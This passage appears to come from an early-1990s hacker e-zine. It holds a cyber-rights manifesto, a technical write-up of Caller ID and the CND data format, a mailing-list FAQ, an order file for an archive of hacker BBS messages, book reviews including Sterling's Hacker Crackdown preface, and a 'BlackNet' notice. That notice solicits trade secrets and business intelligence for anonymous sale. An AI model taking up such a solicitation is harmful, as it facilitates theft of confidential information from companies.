America, have been openly repressed and attacked by all branches and
divisions of the United States Government, in direct violation of our
natural rights and rights granted to us via social contract! The Electronic
Community is one of the world&#039;s greatest examples of the power of freedom
and democracy. Most of Cyberspace was not created by businesses looking for
profit, or by governments looking for more efficient control, but mainly by
ordinary citizens looking for a medium through which they could communicate
with others, and express their thoughts and ideas. The computerized
telecommunications used by the electronic community is a medium unlike any
that has ever existed. It is a decentralized, mostly uncensored, and public
forum for open discussion on a world wide basis. It provides ordinary
citizens with the ability to express their ideas to anyone willing to
listen, with no economic or social barriers and no prejudgments. It gives
everyone in the world access to all the knowledge and information the
world has to offer. It has continually shattered deeply ingrained social
prejudices concerning characteristics such as age, race, wealth, and sex.
In fact, it is common to find 14 year olds arguing philosophy with 41 year
olds on America&#039;s computer networks!
        However, instead of embracing this great tool of freedom, the
United States Government has reacted to it with fear and ignorance. They
have completely ignored the positive effects the existence of this resource
is already having on society. In fact, they have done little, if anything,
to even gain an understanding of the electronic community and it&#039;s
citizens. They have thought only of the damage that could be wrought if
access to this kind of knowledge and information fell into the &quot;wrong
hands.&quot; They have labeled everyone in the electronic community a potential
criminal, and have cracked down on any kind of activity which has not met
their standards. In doing so they have crushed the free flow of ideas,
trampled on the constitution, and blatantly encroached upon the civil rights
of the people living and working on American&#039;s computer networks. They have
chosen safety above freedom, and in doing so they have threatened the
existence of one of the most important social developments of the twentieth
century...
They have ensued upon a Campaign of Terror, using fear to control and
        oppress the Electronic Community.
They have openly and blatantly violated local, state, and federal law, and
        internationally accepted standards for human rights.
They have used misinformation to set certain areas of the electronic
 community off against one another, or to label certain areas as
 criminal, while they have attacked the entire community without
 regard to action or position.
They have lied to the press, to themselves, and to the American people in
 order to keep their actions unquestioned.
They have imposed taxes and tariffs and have priced public utilities with
        the specific intent of effecting a chill upon the free flow of
        thoughts and ideas.
They have used technology to amass enormous amounts of information on
        innocent citizens in order to control and oppress them.
They have judged the interests of private industry to be more important than
 the interests of the general population.
They have attacked innocent citizens in order to increase the profits of
 certain industries.
They have declared themselves immune from the legal and moral standards
 they expect from the rest of society.
They have, on a regular basis, committed the very acts they have called
 criminal.
They have tried to criminalize personal privacy while belligerently
 defending the privacy of businesses and of government.
They have attempted to control the minds of the American people by
 criminalizing certain knowledge and information.
They have prevented the preparation of thoughts and ideas for public
        dissemination.
They have threatened innocent citizens with loss of their right to life,
        liberty, property, and the pursuit of happiness in order to control
        their thoughts, opinions, and actions.
They have repeatedly made laws and taken legal action in areas and/or
 concerning subjects of which they have little or no understanding.
They have seized, damaged, and destroyed the property of innocent citizens.
They have wrongly imprisoned citizens based on questionable information for
        actions which are negligible and, at worst, legally gray.
They have directly attacked innocent citizens in order to keep them from
        publicly assembling.
They have spied on and attempted to interfere with the private
        communications of innocent citizens.
They have made unreasonable and excessive searches and seizures.
They have punished innocent citizens without trial.
They have attempted to effect a chill on the free flow of thoughts and
        ideas.
They have affected to render the government independent of and superior to
 the people.
        We cannot, we WILL not, allow this tyranny to continue! The United
States Government has ignored the voice of the Electronic Community long
enough! When we told the government that what they were doing was wrong,
they refused to listen! When we formed political action groups to bring our
cases to court and before Congress, we were told that we were using
loopholes in the law to get away with crime!!! We have, in a peaceful and
respectful manner, given our government more than reasonable petition for
redress of our grievances, but if anything the situation has gotten worse!
Government administrations use computer crime as a weapon in internal
battles over jurisdiction. Government officials, who have only the
slightest understanding of computer science, use computer crime as a tool
for career success. Elected Representatives, who have absolutely no
understanding of computers, use &quot;information superhighways&quot;, computer
crime, and cryptography to gain constituent money and voter support! The
Electronic Community, the only group who fully understands the issues
involved here, and the only group who is effected by the decisions being
made, has been completely ignored! We have sat around and discussed these
wrongs long enough! NOW IS THE TIME TO STAND UP AND DEMAND A REDRESS OF OUR
GRIEVANCES BY ANY AND ALL MEANS AVAILABLE! We must scream the truth so
loudly that we drown out everything else! We must save our small community
from destruction so that when the rest of society is ready, the world will
still have a forum for free speech and open communication. We must demand
freedom for America&#039;s Electronic Community!!!

   New TimeWasters T-shirts !

Do you know the feeling ? You&#039;re behind your terminal for hours,
browsing the directories of your school&#039;s UNIX system. Instead of
holes, bugs and bad file permissions you find tripwire, TCPwrapper and
s/key. You run a file with a s-bit and immediately you get a mail from
the system admin asking what you are doing. In other words, no chance
to ever become a good hacker there.

Now you have the chance to at least pretend to be an eleet
hacker. The Dutch hacking fanatics The TimeWasters have released
the third version of their cool &#039;hacker&#039; T-shirt. Because
the previous versions were too limited (20 and 25 shirts) we
printed no less than 200 shirts this time.

Of course you want to know, what does it look like ?
On the front, a TimeWasters logo in color. Below that a picture
of two hacking dudes, hanging behind their equipment, also
featuring a stack of phracks, pizza boxes, beer, kodez, and
various computer-related stuff with a &#039;No WsWietse&#039; sticker.
On the back, the original TimeWasters logo with the broken
clock. Below it, four original and dead funny real quotes
featuring the art of Time Wasting.

Wearing this shirt can only provoke one reaction; WOW !
Imagine going up to the helpdesk wearing this shirt and
keeping a straight face while asking a security question !

And for just $2 more you&#039;ll get a pair of sunglasses with
the text &#039;TimeWasters&#039; on them !

Caller ID Technical Details
by Hyperborean Menace

The way Caller ID works internally is through SS7 (Signalling System 7)
messages between telephone switches equipped to handle SS7.  These messages
pass all the call information (block/no block, calling number, etc.).
The calling number is sent as part of the SS7 call setup data on all SS7
routed calls (i.e. all calls carried between switches that are SS7
connected).

The calling number is sent between switches always, regardless of
whether or not *67 (Caller ID Block) is dialed.  It just sends along a
privacy indicator if you dial *67, and then the final switch in the path
will send a &quot;P&quot; instead of the calling number to the Caller ID box.
(But it will still store the actual number - *69 will work whether or
not the caller dialed *67).  What the final switch along the path does
with the calling number depends on how the switch is configured.  If you
are not paying for Caller ID service, the switch is configured so that
it will not transmit the Caller ID data.

This is entirely separate from Automatic Number Identification, which is sent
along SS7 where SS7 is available, but can also be sent using other methods,
so that ALL switches (for many years now) have been able to send ANI (which
is what Long Distance companies used to know who to bill).  Enhanced 911 is
NOT based on Caller ID, but on ANI, thus, it will work for anyone, not just
people connected to SS7 capable switches.  And, of course, *67 will have no
effect on Enhanced 911 either.

Also interesting is the effect call forwarding has on the various services.
Say I have my home telephone forwarded to Lunatic Labs, and it has
Caller ID.  If you call me, the call will forward to Lunatic Labs, and
its Caller ID box will show YOUR number, not mine (since your line is
the actual one making the call).

However, ANI is based on the Billing Number (who is paying for the call (or
would pay if it weren&#039;t free), not on who is actually making the call.
Thus, if I forward my telephone to an 800 Number that gets ANI (such as the
cable pay-per-view order number), and you call me, they will get MY number
(since I would be the one paying for that portion of the call, except that
800 Numbers are free), and you will end up ordering pay-per-view for
me...


CNID (Caller ID) Technical Specifications


 PARAMETERS
 The data signalling interface has the following characteristics:
        Link Type:           2-wire, simplex
        Transmission Scheme:    Analog, phase-coherent FSK
        Logical 1 (mark)        1200 +/- 12 Hz
        Logical 0 (space)       2200 +/- 22 Hz
        Transmission Rate:         1200 bps
        Transmission Level:        13.5 +/- dBm into 900 ohm load

 (I have copied this data as presented.  I believe the
 transmission level is meant to be -13.5 dBm.)

 [It is indeed -13.5 dBm]

 PROTOCOL
 The protocol uses 8-bit data words (bytes), each bounded by a
 start bit and a stop bit.  The CND message uses the Single Data
 Message format shown below.

 [ I belive this is the same as standard asynchronous serial - I think the
 start bit is a &quot;space&quot;, and the stop bit is a &quot;mark&quot; ]

 Channel  Carrier  Message  Message  Data     Checksum
 Seizure  Signal   Type     Length   Word(s)  Word
 Signal            Word     Word

 CHANNEL SEIZURE SIGNAL
 The channel seizure is 30 continuous bytes of 55h (01010101)
 providing a detectable alternating function to the CPE (i.e. the
 modem data pump).

 [CPE = Customer Premises Equipment --i.e. your Caller ID Box]

 CARRIER SIGNAL
 The carrier signal consists of 130 +/- 25 mS of mark (1200 Hz) to
 condition the receiver for data.

 MESSAGE TYPE WORD
 The message type word indicates the service and capability
 associated with the data message.  The message type word for CND
 is 04h (00000100).

 MESSAGE LENGTH WORD
 The message length word specifies the total number of data words
 to follow.

 DATA WORDS
 The data words are encoded in ASCII and represent the following
 information:

 o  The first two words represent the month
 o  The next two words represent the day of the month
 o  The next two words represent the hour in local military time
 o  The next two words represent the minute after the hour
 o  The calling party&#039;s directory number is represented by the
        remaining  words in the data word field

 If the calling party&#039;s directory number is not available to the
 terminating central office, the data word field contains an ASCII
 &quot;O&quot;.  If the calling party invokes the privacy capability, the
 data word field contains an ASCII &quot;P&quot;.

 [ Note that &#039;O&#039; will generally result in the Caller-ID box displaying
 &quot;Out Of Area&quot; indicating that somewhere along the path the call took from
 its source to its destination, there was a connection that did not pass
 the Caller ID data.  Generally, anything out of Southwestern Bell&#039;s area
 will certainly generate a &#039;O&#039;, and some areas in SWB territory might also
 not have the SS7 connections required for Caller ID]

 CHECKSUM WORD
 The Checksum Word contains the twos complement of the modulo 256
 sum of the other words in the data message (i.e., message type,
 message length, and data words).  The receiving equipment may
 calculate the modulo 256 sum of the received words and add this
 sum to the received checksum word.  A result of zero generally
 indicates that the message was correctly received.  Message
 retransmission is not supported.

 EXAMPLE CND SINGLE DATA MESSAGE
 An example of a received CND message, beginning with the message
 type word, follows:

 04 12 30 39 33 30 31 32 32 34 36 30 39 35 35 35 31 32 31 32 51

 04h=  Calling number delivery information code (message type word)
 12h= 18 decimal; Number of data words (date, time, and directory
        number words)
 ASCII 30,39= 09; September
 ASCII 33,30= 30; 30th day
 ASCII 31,32= 12; 12:00 PM
 ASCII 32,34= 24; 24 minutes (i.e., 12:24 PM)
 ASCII 36,30,39,35,35,35,31,32,31,32= (609) 555-1212; calling
                          party&#039;s directory number
 51h=  Checksum Word

 [ There is also a Caller Name service that will transmit the number and the
 name of the caller.  The basic specs are the same as just numbers, but more
 data is transmitted.  I don&#039;t have the details of the data stream for that.]

 DATA ACCESS ARRANGEMENT (DAA) REQUIREMENTS
 To receive CND information, the modem monitors the phone line
 between the first and second ring bursts without causing the DAA
 to go off hook in the conventional sense, which would inhibit the
 transmission of CND by the local central office.  A simple
 modification to an existing DAA circuit easily accomplishes the
 task.

 [i.e. The Caller-ID Device should present a high impedance to the line]

 MODEM REQUIREMENTS
 Although the data signalling interface parameters match those of
 a Bell 202 modem, the receiving CPE need not be a Bell 202
 modem.  A V.23 1200 bps modem receiver may be used to demodulate
 the Bell 202 signal.  The ring indicate bit (RI) may be used on a
 modem to indicate when to monitor the phone line for CND
 information.  After the RI bit sets, indicating the first ring
 burst, the host waits for the RI bit to reset.  The host then
 configures the modem to monitor the phone line for CND
 information.

 According to Bellcore specifications, CND signalling starts as
 early as 300 mS after the first ring burst and ends at least 475
 mS before the second ring burst.

The Frog Farm Mailing List FAQ v1.1
January 20th, 1994


1. What is this I am reading?
2. What is the Frog Farm?
3. Okay, so what&#039;s the Frog Farm mailing list?
4. Are there any rules enforced on the mailing list?
5. I can see all the addresses of the subscribers!
6. You must be Nazis. After all, aren&#039;t people who hate Jews,
 blacks, etc., the only people who talk about this sort of thing?

1. What is this I am reading?

This is the FAQ for the Frog Farm mailing list. It is NOT the FAQ
for the Frog Farm. The FAQ for the Frog Farm is much larger (just
over 100 Kbytes in size).


2. What is the Frog Farm?

Read the FAQ. You can FTP it from etext.archive.umich.edu in the
/pub/Legal/FrogFarm directory (also accessible via Gopher). If
you do not have FTP access, you may request the FAQ via e-mail
from schirado@lab.cc.wmich.edu.


3. Okay, so what&#039;s the Frog Farm mailing list?

frog-farm@blizzard.lcs.mit.edu is an unmoderated e-mail forum
devoted to the discussion of claiming, exercising and defending
Rights in America, past, present and future. Topics include, but
are not limited to, conflicts which can arise between a free
people and their public servants when said servants exceed the
scope of their powers, and possible methods of dealing with such
conflicts.

To subscribe to the list, send a message containing the single
line:

  ADD &lt;your-preferred-email-addr&gt;

to frog-farm-request@blizzard.lcs.mit.edu.

To remove your subscription from the forum, send a message
containing the single line:

  REMOVE &lt;same-email-addr-as-above&gt;

to frog-farm-request@blizzard.lcs.mit.edu.

Note that these commands must be in the BODY of the message; the
contents of the Subject line are ignored.

While you are subscribed, send mail to

frog-farm@blizzard.lcs.mit.edu

to echo your message to all other list subscribers.


4. Are there any rules enforced on the mailing list?

Only two:

1) Do not reveal the e-mail addresses of any subscribers to any
   individuals who are not subscribers. You may freely
   redistribute any article posted to the Frog Farm, subject to
   whatever conditions the poster may have placed on it. For
   example, some people attach a notice to their message stating
   that they are NOT allowing the redistribution of their message
   under ANY circumstances, some people stipulate that it may be
   redistributed only if it is unaltered in any way, etc.

2) No flaming is permitted. The list maintainers are the sole
   judges of what constitutes flaming.


5. I can see all the addresses of the subscribers!

Under normal circumstances, you can&#039;t see the names. If you can,
you had to work at it; if so, you obviously know what you&#039;re
doing, and you should have known better. Try not to let your
curiosity overwhelm your respect for the privacy of others.

The security on this list is not as tight as it could be,
and it is a trivial process for a knowledgeable hacker or hackers
to circumvent it. If you know how to do this, please don&#039;t do it.



6. You must be Nazis. After all, aren&#039;t people who hate Jews,
 blacks, etc., the only people who talk about this sort of thing?

Not at all. The official position of the Frog Farm is that every
human being, of any sex or race, has &quot;certain inalienable Rights&quot;
which may not be violated for any cause or reason. Anyone may
claim and exercise Rights in America, providing they possess the
necessary courage and mental competence.

The Frog Farm provides a List of Interesting Organizations to its
subscribers, which may include organizations or persons who
believe in a god or gods, or promote the idea that certain races
are inferior or perhaps part of a conspiratorial plot to enslave
everyone else. The list maintainers make every effort to note
such idiotic beliefs, where they exist, and encourage people not
to throw out the baby with the bathwater, but to seek the truth
wherever it may be found.

Every individual is unique, and none may be judged by anything
other than their words and actions.

      The LOD Communications Underground H/P BBS Message Base Project:

                   Information/Order File: Brief Version
                                 2/17/94


   This is a short version of the longer, 35K (12 page) Order/Info file. If
you want the full file, sample message file, detailed tables of contents file,
etc. you can request it from lodcom@mindvox.phantom.com or choose menu item
#5 on the Mindvox Gopher Server by using any gopher and opening a connection
with the hostname: mindvox.


The Project:
------------

   Throughout history, physical objects have been preserved for posterity for
the benefit of the next generation of humans.  Cyberspace, however, isn&#039;t very
physical; data contained on floppy diskettes has a finite lifetime as does the
technology to retrieve that data.  The earliest underground hacker bulletin
board systems operated at a time when TRS-80s, Commodore 64s, and Apple ][s
were state-of-the-art.  Today, it is difficult to find anyone who has one of
these machines in operating condition, not to mention the brain cells left to
recall how to operate them. :-(

   LOD Communications has created a historical library of the &quot;dark&quot; portion
of Cyberspace.  The project&#039;s goal is to acquire as much information as
possible from underground Hack/Phreak (H/P) bulletin boards that were in
operation during a decade long period, dating from the beginnings (in 1980/81
with 8BBS and MOM:  Modem Over Manhattan) to the legendary OSUNY, Plover-NET,
Legion of Doom!, Metal Shop, etc. up through the Phoenix Project circa
1989/90. Currently, messages from over 75 different BBSes have been retrieved,
although very few message bases are 100% complete.  However, not having a
complete &quot;set&quot; does not diminish their value.

  DONATIONS: A portion of every order will be donated to the following causes:

             1) A donation will be made to help pay for Craig Neidorf&#039;s
                (Knight Lightning - Metal Shop Private Co-Sysop) Legal Defense
                bills (resulting from his successful campaign to protect First
                Amendment rights for electronic publishing, i.e. the
                PHRACK/E911 case).

             2) The SotMESC Scholarship Fund.  The SotMESC Scholarship is
                awarded to students writing exceptional papers of 20 to 30
                pages on a topic based on computer culture (ie, hacking
                culture, virus writing culture, Internet culture, etc.) For
                more details write: SotMESC  PO BOX 573  Long Beach, MS 39560
                or email: rejones@seabass.st.usm.edu

    NOTE: THE FIRST DONATIONS TO EACH OF THE ABOVE TWO CAUSES HAVE ALREADY
          BEEN MADE.

What Each &quot;Message Base File&quot; Contains:
---------------------------------------

     - A two page general message explaining H/P BBS terminology and format.

     - The BBS Pro-Phile:  A historical background and description of the BBS
       either written by the original system operator(s) or those who actually
       called the BBS when it was in operation (it took months to track the
       appropriate people down and get them to write these specifically for
       this project; lesser known BBSes may not contain a Pro-Phile);

     - Messages posted to the BBS (i.e. the Message Base);

     - Downloaded Userlists if available; and

     - Hacking tutorials a.k.a. &quot;G-Philes&quot; that were on-line if available.

   It is anticipated that most people who are interested in the message bases
have never heard of a lot of the BBS names shown in the listing.  If you have
seen one set of messages, you have NOT seen them ALL.  Each system had a
unique personality, set of users, and each has something different to offer.


Formats the Message Base Files are Available in:
------------------------------------------------

   Due to the large size of the Message Base Files, they will be compressed
using the format of your choice.  Please note that Lodcom does NOT include the
compression/uncompression program (PKZIP, PAK, MAC Stuffit, etc.).  ASCII
(uncompressed) files will be provided for $5.00 extra to cover additional
diskette (files that are uncompressed require more than double the number of
diskettes) and shipping costs.  The files are available for:

     - IBM (5.25 or 3.5 inch)
     - APPLE MACINTOSH (3.5 inch)
     - ATARI ST (MS-DOS Compatible 3.5 inch)
     - AMIGA (3.5 inch)
     - PAPER versions can be ordered but cost triple (due to increased costs
       to ship, time to print, and messages being in 40 column format which
       wastes lots of paper...save those trees!).  Paper versions take twice
       the time to deliver but are laser printed.

Orders are expected to arrive at the requesters&#039; physical mail box in 3-5
weeks upon receipt of the order.


The Collection:
---------------

   This is where we currently stand as far as what has been completed and the
estimated completion dates for the rest of the project:

                       Volume 1: 5700+ Messages, 20 H/P BBSes, COMPLETED.
                       Volume 2: 2100+ Messages, 25 H/P BBSes, COMPLETED.
                       Volume 3: 20-30 H/P BBSes, End of March 1994.
                       Volume 4: ????? H/P BBSes, Sometime after 3/94.
                       All in all there is expected to be 12000+ Messages.

       NOTE: Additional material has recently been received for Boards already
released in the first 2 volumes. Those who have already ordered will receive
the updated versions with the additional messages that have been recovered.


*** Blurbs and Excerpts: ***
----------------------------

    Blurbs from some of those who have received the first two Volumes:

   &quot;I am stunned at the quality of this undertaking. It brought back that
    feeling of involvement and interest.&quot; --P.P.

   &quot;I think of the release of the H/P Message Bases as an opening salvo in
    the battle for the truth about fraud in the Telecom Industry.&quot; --J.J.

   &quot;Still sifting through Volume one. For now I&#039;ve taken the approach of
    putting all the files into one subdirectory and searching it for topics
    of interest. Prime and Primos computers was my first topic of interest
    and Volume I yielded quite a bit of odd and useful information.&quot; --K.B.

   &quot;...the professionalism of the Message Bases is of a superior quality.
    Somehow they bring back that age of innocence. Boy do I miss those
    times.&quot; --A.C.

   Excerpt from 2600 Magazine (The Hacker Quarterly) Autumn 1993 Issue,
review by Emmanuel Goldstein entitled NEVER ERASE THE PAST.

    &quot;...is this the sort of thing that people really care about? Undoubtedly,
many will shrug it off as useless, boring teenagers that have absolutely no
relevance to anything in the real world. The fact remains, however, that this
is history. This is *our* history, or at least, a small part of it. The boards
included in this project - Sherwood Forest I &amp; II, Metal Shop Private, OSUNY,
Phoenix Project, and a host of others - are among the more interesting hacker
boards, with some classic dialogue and a gang of hacker stars-to-be. Nearly
all of these boards were raided at one time or another, which makes it all
even more fascinating.&quot;

    &quot;Had the LODCOM project not come along when it did, a great many of these
message bases probably would have been lost forever. Providing this service
to both the hacker community and those interested in it is a noble cause that
is well worth the price. If it succeeds, some valuable hacker data will be
preserved for future generations.&quot;

    The Lodcom project was also reviewed in Computer underground Digest Issue
#5.39 and will be reviewed by GRAY AREAS MAGAZINE in their summer issue. You
should be able to find the issue on most newsstands in about 3 months. You can
contact Gray Areas by phone: 215-353-8238 (A machine screens their calls), by
email: grayarea@well.sf.ca.us, and by regular mail: Gray Areas, Inc. , PO BOX
808, Broomall, PA 19008-0808. Subscriptions are $18.00 a year U.S. and we
highly recommend the magazine if you are interested in the gray areas of life.

                           BooX for Hackers
                           ================

by Seven Up

Usually I am not reading too many books. But there are two rather new
ones everyone should read and have.

UNIX Power Tools
================

The first one is made for people who like to play with UNIX.
It is called &#039;UNIX Power Tools&#039;, published by Bantam and O&#039;Reilly. It
contains over 1000 pages and weighs about 3 pounds, but contains a CD
ROM. It contains pretty useful information and examples on how to use
standard UNIX utilities and how to solve certain tasks. Some of the topics
it covers are:
Encryption of passwords, shell programming, config files for logging in
and out, setting shell prompts, vi tips &amp; tricks, redirecting and piping,
sed &amp; awk and much more. Like most O&#039;Reilly books, it is written with
a lot of humor and easy to read. To me, this book is a reference for almost
any question. You might even feel that you don&#039;t need most of your old
UNIX books anymore, because this book almost covers it all. It is also a lot
of fun just to browse through the book randomly and read articles on
different subjects. There really is no need and no use to read it from A to Z.
A lot of their tricks is collected from Usenet Newsgroups. All of their use-
ful programs, scripts and general PD programs you will find on FTP sites
are on the CD. However, if you want a different medium they charge you $40.
And now we come to the only problem of the book: the price! I think compared
to the contents, charging $59.95 is justified; but it might scare off many
people anyway. Finally I would recommend this book to everyone who uses
UNIX a lot and likes to experiment and play with it (and has 60 bucks left).


Hacker Crackdown
================

Now reading Bruce&#039;s book won&#039;t cost you 60 bucks. In fact, it will even
be totally FREE! I won&#039;t say too much about the book, because there have
already been great reviews in Phrack and 2600 in Spring/Summer 1993. It
is probably the most interesting and entertaining book about Hackers and
Fedz from 1993. But now Bruce decided to release the book as online
freeware - you may just grab the 270k file from a site, read it and give
it to anyone you want.

But let&#039;s listen to Bruce now and what he has to say...


January 1, 1994 -- Austin, Texas

     Hi, I&#039;m Bruce Sterling, the author of this
electronic book.

     Out in the traditional world of print, *The
Hacker Crackdown* is ISBN 0-553-08058-X, and is
formally catalogued by the Library of Congress as &quot;1.
Computer crimes -- United States.  2. Telephone --
United States -- Corrupt practices.  3.  Programming
(Electronic computers) -- United States -- Corrupt
practices.&quot;  &#039;Corrupt practices,&#039; I always get a kick out
of that description.  Librarians are very ingenious
people.

     The paperback is ISBN 0-553-56370-X.  If you go
and buy a print version of *The Hacker Crackdown,*
an action I encourage heartily, you may notice that
in the front of the book,  beneath the copyright
notice  -- &quot;Copyright (C) 1992 by Bruce Sterling&quot; -- it
has this little block of printed legal boilerplate from
the publisher.  It says, and I quote:

     &quot;No part of this book may be reproduced or
transmitted in any form or by any means, electronic
or mechanical, including photocopying, recording,
or by any information storage and retrieval system,
without permission in writing from the publisher.
For information address:  Bantam Books.&quot;

     This is a pretty good disclaimer, as such
disclaimers go.  I collect intellectual-property
disclaimers, and I&#039;ve seen dozens of them, and this
one is at least pretty straightforward.  In this narrow
and particular case, however, it isn&#039;t quite accurate.
Bantam Books puts that disclaimer on every book
they publish, but Bantam Books does not, in fact,
own the electronic rights to this book.  I do, because
of certain extensive contract maneuvering my
agent and I went through before this book was
written.  I want to give those electronic publishing
rights away through certain not-for-profit channels,
and I&#039;ve convinced Bantam that this is a good idea.

     Since Bantam has seen fit to peaceably agree to
this scheme of mine, Bantam Books is not going to
fuss about this.  Provided you don&#039;t try to sell the
book, they are not going to bother you for what you
do with the electronic copy of this book. If you want
to check this out personally, you can ask them;
they&#039;re at 1540 Broadway NY NY 10036.  However, if
you were so foolish as to print this book and start
retailing it for money in violation of my copyright
and the commercial interests of Bantam Books,
then Bantam, a part of the gigantic Bertelsmann
multinational publishing combine, would roust
some of their heavy-duty attorneys out of
hibernation and crush you like a bug.  This is only to
be expected.  I didn&#039;t write this book so that you
could make money out of it.  If anybody is gonna
make money out of this book, it&#039;s gonna be me and
my publisher.

     My publisher deserves to make money out of
this book.  Not only did the folks at Bantam Books
commission me to write the book, and pay me a
hefty sum to do so, but they bravely printed, in text,
an electronic document the reproduction of which
was once alleged to be a federal felony.  Bantam
Books and their numerous attorneys were very
brave and forthright about this book.  Furthermore,
my former editor at Bantam Books, Betsy Mitchell,
genuinely cared about this project, and worked hard
on it, and had a lot of wise things to say about the
manuscript.  Betsy deserves genuine credit for this
book, credit that editors too rarely get.

     The critics were very kind to *The Hacker
Crackdown,* and commercially the book has done
well.  On the other hand, I didn&#039;t write this book in
order to squeeze every last nickel and dime out of
the mitts of impoverished sixteen-year-old
cyberpunk high-school-students.  Teenagers don&#039;t
have any money -- (no, not even enough for the  six-
dollar *Hacker Crackdown* paperback, with its
attractive bright-red cover and useful index).   That&#039;s
a major reason why teenagers sometimes succumb
to the temptation to do things they shouldn&#039;t, such
as swiping my books out of libraries.   Kids:  this one
is all yours, all right?  Go give the print version back.
*8-)

     Well-meaning, public-spirited civil libertarians
don&#039;t have much money, either.   And it seems
almost criminal to snatch cash out of the hands of
America&#039;s direly underpaid electronic law
enforcement community.

     If you&#039;re a computer cop, a hacker, or an
electronic civil liberties activist, you are the target
audience for this book.  I wrote this book because I
wanted to help you, and help other people
understand you and your unique, uhm, problems.  I
wrote this book to aid your activities, and to
contribute to the public discussion of important
political issues.  In giving the text away in this
fashion, I am directly contributing to the book&#039;s
ultimate aim:  to help civilize cyberspace.

     Information *wants* to be free.  And  the
information inside this book longs for freedom with
a peculiar intensity.  I genuinely believe that the
natural habitat of this book is inside an electronic
network.  That may not be the easiest direct method
to generate revenue for the book&#039;s author, but that
doesn&#039;t matter; this is where this book belongs by its
nature.  I&#039;ve written other books -- plenty of other
books -- and I&#039;ll write more and I am writing more,
but this one is special.  I am making *The Hacker
Crackdown* available electronically as widely as I
can conveniently manage, and if you like the book,
and think it is useful, then I urge you to do the same
with it.

     You can copy this electronic book.   Copy the
heck out of it, be my guest, and give those copies to
anybody who wants them.  The nascent world of
cyberspace is full of sysadmins, teachers, trainers,
cybrarians, netgurus, and various species of
cybernetic activist.  If you&#039;re one of those people,  I
know about you, and I know the hassle you go
through to try to help people learn about the
electronic frontier.  I hope that possessing this book
in electronic form will lessen your troubles.  Granted,
this treatment of our electronic social spectrum is
not the ultimate in academic rigor.  And politically, it
has something to offend and trouble almost
everyone.   But hey, I&#039;m told it&#039;s readable, and at
least the price is right.

     You can upload the book onto bulletin board
systems, or Internet nodes, or electronic discussion
groups.  Go right ahead and do that, I am giving you
express permission right now.  Enjoy yourself.

     You can put the book on disks and give the disks
away, as long as you don&#039;t take any money for it.

     But this book is not public domain.  You can&#039;t
copyright it in your own name.   I own the copyright.
Attempts to pirate this book and make money from
selling it may involve you in a serious litigative snarl.
Believe me, for the pittance you might wring out of
such an action, it&#039;s really not worth it.  This book
don&#039;t &quot;belong&quot; to you.  In an odd but very genuine
way, I feel it doesn&#039;t &quot;belong&quot; to me, either.  It&#039;s a
book about the people of cyberspace, and
distributing it in this way is the best way I know to
actually make this information available, freely and
easily, to all the people of cyberspace -- including
people far outside the borders of the United States,
who otherwise may never have a chance to see any
edition of the book, and who may perhaps learn
something useful from this strange story of distant,
obscure, but portentous events in so-called
&quot;American cyberspace.&quot;

      This electronic book is now literary freeware.  It
now belongs to the emergent realm of alternative
information economics.  You have no right to make
this electronic book part of the conventional flow of
commerce.  Let it be part of the flow of knowledge:
there&#039;s a difference.   I&#039;ve divided the book into four
sections, so that it is less ungainly for upload and
download; if there&#039;s a section of particular relevance
to you and your colleagues, feel free to reproduce
that one and skip the rest.

     Just make more when you need them, and give
them to whoever might want them.

     Now have fun.

Introduction to BlackNet


Your name has come to our attention. We have reason to believe you may
be interested in the products and services our new organization,
BlackNet, has to offer.

BlackNet is in the business of buying, selling, trading, and otherwise
dealing with *information* in all its many forms.

We buy and sell information using public key cryptosystems with
essentially perfect security for our customers. Unless you tell us who
you are (please don&#039;t!) or inadvertently reveal information which
provides clues, we have no way of identifying you, nor you us.

Our location in physical space is unimportant. Our location in
cyberspace is all that matters. Our primary address is the PGP key
location: &quot;BlackNet&lt;nowhere@cyberspace.nil&gt;&quot; and we can be contacted
(preferably through a chain of anonymous remailers) by encrypting a
message to our public key (contained below) and depositing this
message in one of the several locations in cyberspace we monitor.
Currently, we monitor the following locations: alt.extropians,
alt.fan.david-sternlight, and the &quot;Cypherpunks&quot; mailing list.

BlackNet is nominally nondideological, but considers nation-states,
export laws, patent laws, national security considerations and the
like to be relics of the pre-cyberspace era. Export and patent laws
are often used to explicity project national power and imperialist,
colonialist state fascism. BlackNet believes it is solely the
responsibility of a secret holder to keep that secret--not the
responsibility of the State, or of us, or of anyone else who may come
into possession of that secret. If a secret&#039;s worth having, it&#039;s worth
protecting.

BlackNet is currently building its information inventory. We are
interested in information in the following areas, though any other
juicy stuff is always welcome. &quot;If you think it&#039;s valuable, offer it
to us first.&quot;

- - trade secrets, processes, production methods (esp. in
semiconductors) - nanotechnology and related techniques (esp. the
Merkle sleeve bearing) - chemical manufacturing and rational drug
design (esp. fullerines and protein folding) - new product plans, from
children&#039;s toys to cruise missiles (anything on &quot;3DO&quot;?)  - business
intelligence, mergers, buyouts, rumors

BlackNet can make anonymous deposits to the bank account of your
choice, where local banking laws permit, can mail cash directly (you
assume the risk of theft or seizure), or can credit you in
&quot;CryptoCredits,&quot; the internal currency of BlackNet (which you then
might use to buy _other_ information and have it encrypted to your
special public key and posted in public place).

If you are interested, do NOT attempt to contact us directly (you&#039;ll
be wasting your time), and do NOT post anything that contains your
name, your e-mail address, etc. Rather, compose your message, encrypt
it with the public key of BlackNet (included below), and use an
anonymous remailer chain of one or more links to post this encrypted,
anonymized message in one of the locations listed (more will be added
later). Be sure to describe what you are selling, what value you think
it has, your payment terms, and, of course, a special public key (NOT
the one you use in your ordinary business, of course!) that we can use
to get back in touch with you. Then watch the same public spaces for a
reply.

(With these remailers, local PGP encryption within the remailers, the
use of special public keys, and the public postings of the encrypted
messages, a secure, two-way, untraceable, and fully anonymous channel
has been opened between the customer and BlackNet. This is the key to
BlackNet.)

A more complete tutorial on using BlackNet will soon appear, in
plaintext form, in certain locations in cyberspace.

Join us in this revolutionary--and profitable--venture.


BlackNet&lt;nowhere@cyberspace.nil&gt;

This issue our prophile introduces you to one of the all-around coolest
people ever to show up in the computer underground.  Someone I&#039;m happy
to have had the good fortune to meet and force to ingest excessive quantities
of intoxicating liquids and other unmentionables.  Someone who very
recently showed up on tabloid television amazingly for something other than
computer hacking.  Someone we know as:

Computers Owned:

1st Computer-Texas Instruments T-1000
-------------------------------------
Once I expanded the memory (4K plug in Module, for a total of
8k), I was unstoppable in BASIC.

Commodore Vic-20
----------------
What can you say about a Vic-20?

Commodore 64
------------
Now I was big time.  1541 Disk drive was an unbelievable upgrade
from my Vic-20 and T-1000 mass storage devices (Cassette
Recorder).

Apple //C
---------
I was now a \/\/Arez d00d.  What else could you be if you had an
